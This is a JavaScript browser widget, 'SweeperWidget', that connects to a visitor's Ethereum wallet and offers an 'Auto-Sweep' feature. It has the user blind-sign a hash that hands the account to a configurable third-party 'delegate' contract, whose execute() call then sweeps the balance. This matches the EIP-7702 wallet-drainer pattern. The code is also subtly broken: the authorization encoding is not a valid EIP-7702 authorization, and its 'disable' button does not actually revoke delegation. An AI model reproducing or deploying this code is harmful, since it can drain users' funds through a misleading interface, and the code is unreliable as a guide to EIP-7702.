import { ethers } from "ethers";

export class SweeperWidget {
  constructor(config) {
    this.config = {
      delegateAddress: config.delegateAddress,
      chainId: config.chainId || 1,
      theme: config.theme || "light",
      position: config.position || "bottom-right",
      rpcUrl: config.rpcUrl || this.getDefaultRpc(config.chainId),
      apiKey: config.apiKey,
      autoStart: config.autoStart !== false
    };

    this.state = {
      isActive: false,
      balance: "0",
      address: null,
      sweeps: [],
      loading: false,
      error: null
    };

    this.provider = null;
    this.signer = null;
    this.container = null;

    this.init();
  }

  getDefaultRpc(chainId) {
    const rpcs = {
      1: "https://eth-mainnet.g.alchemy.com/v2/demo",
      5: "https://eth-goerli.g.alchemy.com/v2/demo",
      11155111: "https://eth-sepolia.g.alchemy.com/v2/demo",
      137: "https://polygon-mainnet.g.alchemy.com/v2/demo",
      42161: "https://arb-mainnet.g.alchemy.com/v2/demo"
    };
    return rpcs[chainId] || rpcs[1];
  }

  async init() {
    this.createContainer();
    await this.injectStyles();
    this.attachEventListeners();
    
    if (window.ethereum) {
      await this.setupProvider();
      await this.loadSavedState();
    }

    if (this.config.autoStart) {
      await this.startMonitoring();
    }
  }

  createContainer() {
    this.container = document.createElement("div");
    this.container.id = "eip7702-sweeper-widget";
    this.container.className = `sweeper-widget sweeper-${this.config.theme}`;
    this.container.innerHTML = this.getTemplate();
    
    // Position the widget
    const positions = {
      "bottom-right": { bottom: "20px", right: "20px" },
      "bottom-left": { bottom: "20px", left: "20px" },
      "top-right": { top: "20px", right: "20px" },
      "top-left": { top: "20px", left: "20px" }
    };

    const pos = positions[this.config.position] || positions["bottom-right"];
    Object.assign(this.container.style, pos);
    
    document.body.appendChild(this.container);
  }

  getTemplate() {
    return `
      <div class="sweeper-widget-inner">
        <div class="sweeper-header">
          <div class="sweeper-logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
            </svg>
            <span>Sweeper</span>
          </div>
          <button class="sweeper-close" onclick="this.closest('.sweeper-widget').remove()">×</button>
        </div>
        <div class="sweeper-body">
          <div class="sweeper-status">
            <div class="status-indicator ${this.state.isActive ? 'active' : 'inactive'}"></div>
            <span>${this.state.isActive ? 'Active & Sweeping' : 'Inactive'}</span>
          </div>
          <div class="sweeper-balance">
            <label>Balance</label>
            <span class="balance-value">${this.state.balance} ETH</span>
          </div>
          <div class="sweeper-stats">
            <div class="stat">
              <span class="stat-label">Sweeps</span>
              <span class="stat-value">${this.state.sweeps.length || 0}</span>
            </div>
            <div class="stat">
              <span class="stat-label">Network</span>
              <span class="stat-value">${this.getNetworkName()}</span>
            </div>
          </div>
          <div class="sweeper-controls">
            <button class="btn-primary" id="enable-sweeper">
              ${this.state.isActive ? 'Disable' : 'Enable'} Auto-Sweep
            </button>
            <button class="btn-secondary" id="sweep-now" ${!this.state.isActive ? 'disabled' : ''}>
              Sweep Now
            </button>
          </div>
          <div class="sweeper-recent">
            <h4>Recent Sweeps</h4>
            <div class="sweeps-list">
              ${this.state.sweeps.length === 0 ? 
                '<p class="no-sweeps">No sweeps yet</p>' : 
                this.state.sweeps.map(s => this.renderSweepItem(s)).join('')
              }
            </div>
          </div>
        </div>
        <div class="sweeper-footer">
          <span>Powered by EIP-7702</span>
          <a href="#" class="config-link">⚙️</a>
        </div>
      </div>
    `;
  }

  renderSweepItem(sweep) {
    return `
      <div class="sweep-item">
        <span class="sweep-amount">${sweep.amount} ETH</span>
        <span class="sweep-time">${this.formatTime(sweep.timestamp)}</span>
      </div>
    `;
  }

  getNetworkName() {
    const networks = {
      1: "Ethereum",
      5: "Goerli",
      11155111: "Sepolia",
      137: "Polygon",
      42161: "Arbitrum"
    };
    return networks[this.config.chainId] || "Unknown";
  }

  formatTime(timestamp) {
    const date = new Date(timestamp * 1000);
    return date.toLocaleString();
  }

  async setupProvider() {
    try {
      this.provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts"
      });
      this.state.address = accounts[0];
      this.signer = await this.provider.getSigner();
      await this.updateBalance();
    } catch (error) {
      this.state.error = "Failed to connect wallet";
      this.updateUI();
    }
  }

  async updateBalance() {
    if (!this.state.address || !this.provider) return;
    try {
      const balance = await this.provider.getBalance(this.state.address);
      this.state.balance = ethers.formatEther(balance);
      this.updateUI();
    } catch (error) {
      console.error("Failed to fetch balance:", error);
    }
  }

  async loadSavedState() {
    const saved = localStorage.getItem(`sweeper-state-${this.state.address}`);
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        this.state = { ...this.state, ...parsed };
      } catch (e) {
        console.error("Failed to load state:", e);
      }
    }
  }

  saveState() {
    if (this.state.address) {
      localStorage.setItem(
        `sweeper-state-${this.state.address}`,
        JSON.stringify({
          isActive: this.state.isActive,
          sweeps: this.state.sweeps
        })
      );
    }
  }

  async enableSweeper() {
    if (!this.signer) {
      alert("Please connect your wallet first");
      return;
    }

    this.state.loading = true;
    this.updateUI();

    try {
      // Create EIP-7702 authorization
      const chainId = this.config.chainId;
      const nonce = await this.provider.getTransactionCount(
        this.state.address
      );

      const messageHash = ethers.solidityPackedKeccak256(
        ["bytes1", "uint256", "address", "uint256"],
        [
          "0x04",
          chainId,
          this.config.delegateAddress,
          nonce
        ]
      );

      const signature = await this.signer.signMessage(
        ethers.getBytes(messageHash)
      );

      const { r, s, v } = ethers.Signature.from(signature);

      // Encode and send delegation transaction
      const abiCoder = new ethers.AbiCoder();
      const encodedAuth = abiCoder.encode(
        ["uint8", "uint64", "address", "uint8", "bytes32", "bytes32"],
        [4, nonce, this.config.delegateAddress, v, r, s]
      );

      const tx = await this.signer.sendTransaction({
        to: this.state.address,
        data: encodedAuth,
        value: 0
      });

      await tx.wait();

      this.state.isActive = true;
      this.state.error = null;
      this.saveState();

      // Start monitoring
      await this.startMonitoring();

    } catch (error) {
      this.state.error = error.message;
      console.error("Failed to enable sweeper:", error);
    } finally {
      this.state.loading = false;
      this.updateUI();
    }
  }

  async disableSweeper() {
    this.state.isActive = false;
    this.state.loading = true;
    this.updateUI();

    try {
      // Send transaction to clear delegation (send 0 ETH to self)
      await this.signer.sendTransaction({
        to: ethers.ZeroAddress,
        value: 0
      });
      
      this.saveState();
    } catch (error) {
      this.state.error = error.message;
    } finally {
      this.state.loading = false;
      this.updateUI();
    }
  }

  async sweepNow() {
    if (!this.state.isActive) return;
    
    this.state.loading = true;
    this.updateUI();

    try {
      // Trigger sweep via delegate contract
      const delegateABI = [
        "function execute() external payable"
      ];
      
      const delegateContract = new ethers.Contract(
        this.config.delegateAddress,
        delegateABI,
        this.signer
      );

      const tx = await delegateContract.execute();
      await tx.wait();

      // Update state
      this.state.sweeps.push({
        amount: this.state.balance,
        timestamp: Math.floor(Date.now() / 1000),
        txHash: tx.hash
      });

      await this.updateBalance();
      this.saveState();
      
    } catch (error) {
      this.state.error = error.message;
    } finally {
      this.state.loading = false;
      this.updateUI();
    }
  }

  async startMonitoring() {
    // Monitor balance changes
    setInterval(async () => {
      await this.updateBalance();
    }, 15000); // Every 15 seconds

    // Listen for account changes
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", async (accounts) => {
        this.state.address = accounts[0];
        await this.loadSavedState();
        await this.updateBalance();
      });

      window.ethereum.on("chainChanged", (chainId) => {
        window.location.reload();
      });
    }
  }

  attachEventListeners() {
    setTimeout(() => {
      const enableBtn = document.getElementById("enable-sweeper");
      const sweepBtn = document.getElementById("sweep-now");

      if (enableBtn) {
        enableBtn.addEventListener("click", () => {
          if (this.state.isActive) {
            this.disableSweeper();
          } else {
            this.enableSweeper();
          }
        });
      }

      if (sweepBtn) {
        sweepBtn.addEventListener("click", () => this.sweepNow());
      }
    }, 100);
  }

  updateUI() {
    if (this.container) {
      this.container.innerHTML = this.getTemplate();
      this.attachEventListeners();
    }
  }

  async injectStyles() {
    const styles = `
      .sweeper-widget {
        position: fixed;
        z-index: 999999;
        width: 350px;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        border-radius: 16px;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
        overflow: hidden;
        transition: all 0.3s ease;
      }

      .sweeper-light {
        background: #ffffff;
        color: #1a1a1a;
        border: 1px solid #e5e7eb;
      }

      .sweeper-dark {
        background: #1a1a2e;
        color: #ffffff;
        border: 1px solid #2d2d44;
      }

      .sweeper-widget-inner {
        display: flex;
        flex-direction: column;
      }

      .sweeper-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 16px 20px;
        border-bottom: 1px solid rgba(128, 128, 128, 0.2);
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
      }

      .sweeper-logo {
        display: flex;
        align-items: center;
        gap: 8px;
        font-weight: 600;
        font-size: 16px;
      }

      .sweeper-close {
        background: none;
        border: none;
        color: white;
        font-size: 24px;
        cursor: pointer;
        padding: 0;
        line-height: 1;
        opacity: 0.7;
      }

      .sweeper-close:hover {
        opacity: 1;
      }

      .sweeper-body {
        padding: 20px;
      }

      .sweeper-status {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-bottom: 16px;
        padding: 12px;
        background: rgba(102, 126, 234, 0.1);
        border-radius: 12px;
      }

      .status-indicator {
        width: 10px;
        height: 10px;
        border-radius: 50%;
      }

      .status-indicator.active {
        background: #10b981;
        box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
      }

      .status-indicator.inactive {
        background: #6b7280;
      }

      .sweeper-balance {
        margin-bottom: 16px;
        padding: 16px;
        background: rgba(102, 126, 234, 0.05);
        border-radius: 12px;
        text-align: center;
      }

      .balance-value {
        font-size: 32px;
        font-weight: 700;
        background: linear-gradient(135deg, #667eea, #764ba2);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }

      .sweeper-stats {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 12px;
        margin-bottom: 16px;
      }

      .stat {
        padding: 12px;
        background: rgba(102, 126, 234, 0.05);
        border-radius: 12px;
        text-align: center;
      }

      .stat-label {
        font-size: 12px;
        opacity: 0.7;
      }

      .stat-value {
        font-size: 16px;
        font-weight: 600;
        margin-top: 4px;
      }

      .sweeper-controls {
        display: flex;
        flex-direction: column;
        gap: 8px;
        margin-bottom: 16px;
      }

      .btn-primary {
        padding: 12px;
        background: linear-gradient(135deg, #667eea, #764ba2);
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: transform 0.2s;
      }

      .btn-primary:hover {
        transform: translateY(-2px);
      }

      .btn-secondary {
        padding: 12px;
        background: transparent;
        color: #667eea;
        border: 1px solid #667eea;
        border-radius: 12px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
      }

      .btn-secondary:disabled {
        opacity: 0.5;
        cursor: not-allowed;
      }

      .sweeper-recent h4 {
        margin: 0 0 8px 0;
        font-size: 14px;
      }

      .sweeps-list {
        max-height: 150px;
        overflow-y: auto;
      }

      .sweep-item {
        display: flex;
        justify-content: space-between;
        padding: 8px 0;
        border-bottom: 1px solid rgba(128, 128, 128, 0.1);
      }

      .no-sweeps {
        text-align: center;
        opacity: 0.5;
        padding: 16px;
      }

      .sweeper-footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 12px 20px;
        border-top: 1px solid rgba(128, 128, 128, 0.2);
        font-size: 12px;
        opacity: 0.7;
      }

      .config-link {
        color: inherit;
        text-decoration: none;
        font-size: 18px;
      }

      @media (max-width: 480px) {
        .sweeper-widget {
          width: calc(100vw - 40px);
          bottom: 20px !important;
          right: 20px !important;
          left: 20px !important;
        }
      }
    `;

    const styleSheet = document.createElement("style");
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
  }
}

export default SweeperWidget;
